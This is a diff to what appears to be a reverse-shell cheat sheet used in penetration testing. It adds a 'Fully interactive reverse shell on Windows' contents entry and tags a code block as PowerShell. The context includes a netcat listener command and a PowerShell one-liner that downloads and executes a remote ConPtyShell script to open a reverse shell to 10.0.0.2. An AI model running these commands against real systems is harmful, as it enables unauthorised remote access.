@@ -37,6 +37,7 @@
     * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
     * [Other platforms](#other-platforms)
 * [Spawn TTY Shell](#spawn-tty-shell)
+* [Fully interactive reverse shell on Windows](#fully-interactive-reverse-shell-on-windows)
 * [References](#references)
 
 ## Reverse Shell
@@ -525,7 +526,7 @@ stty raw -echo; (stty size; cat) | nc -lvnp 3001
 
 Client Side:
 
-```
+```powershell
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
